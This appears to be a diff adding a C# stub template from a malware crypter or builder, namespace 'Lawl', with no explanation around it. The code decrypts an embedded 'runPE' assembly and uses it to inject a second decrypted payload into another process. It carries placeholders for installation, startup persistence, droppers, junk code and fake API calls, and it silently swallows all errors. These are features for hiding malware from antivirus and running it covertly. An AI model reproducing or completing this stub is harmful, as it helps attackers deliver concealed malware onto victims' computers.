@@ -1,0 +1,49 @@
+using System;
+using System.Resources;
+using System.Reflection;
+using System.Security.Cryptography;
+using System.Text;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.IO.Compression;
+
+[ASSEMBLY-CHANGER]
+
+namespace Lawl
+{
+    class Program
+    {
+        static void Main()
+        {
+            try
+            {
+				[INSTALL]
+				[STARTUP]
+                ResourceManager MANAGER = new ResourceManager("shank", Assembly.GetExecutingAssembly());
+                [DROPPER]
+                [DROPPER2]
+                byte[] b = (byte[])MANAGER.GetObject("runPE");
+                b = Decrypt(b, "{RUNPEKEY}");
+                Assembly asm = Assembly.Load(b);
+                Type t = asm.GetTypes()[[TYPE-NUMBER]];
+                MethodInfo mi = t.GetMethod("[METHOD-NAME]");
+                string into = [INJECT-INTO];
+                byte[] henk = (byte[])MANAGER.GetObject("cheese");
+                [COMPRESSION]
+                henk = Decrypt(henk, "{KEY}");
+                mi.Invoke(Activator.CreateInstance(t), new object[]{henk, into});
+            }
+            catch { }
+        }
+        
+        [DEFAULT-BROWSER]
+
+        [ENCRYPTION]
+        
+        [COMPRESSION-FUNCTION]
+        
+        [JUNK-CODE]
+        
+        [FAKE-API]
+    }
+}
